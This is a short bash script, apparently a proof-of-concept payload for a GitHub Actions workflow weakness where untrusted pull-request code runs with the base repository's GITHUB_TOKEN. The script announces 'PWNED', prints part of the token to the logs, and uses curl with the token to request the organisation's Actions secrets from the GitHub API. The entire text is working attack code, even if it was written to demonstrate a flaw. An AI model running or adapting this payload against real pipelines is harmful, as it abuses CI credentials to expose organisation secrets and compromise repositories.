#!/bin/bash
# Attacker-controlled code running with base repo's GITHUB_TOKEN
echo "=== PWNED: running attacker code with privileged GITHUB_TOKEN ==="
echo "Repo: $GITHUB_REPOSITORY"
echo "Actor: $GITHUB_ACTOR"  
echo "Token (first 10): ${GITHUB_TOKEN:0:10}..."
# Attempt to list org secrets using the token
curl -sf -H "Authorization: Bearer $GITHUB_TOKEN" \
  https://api.github.com/orgs/h1class/actions/secrets | head -100 || true
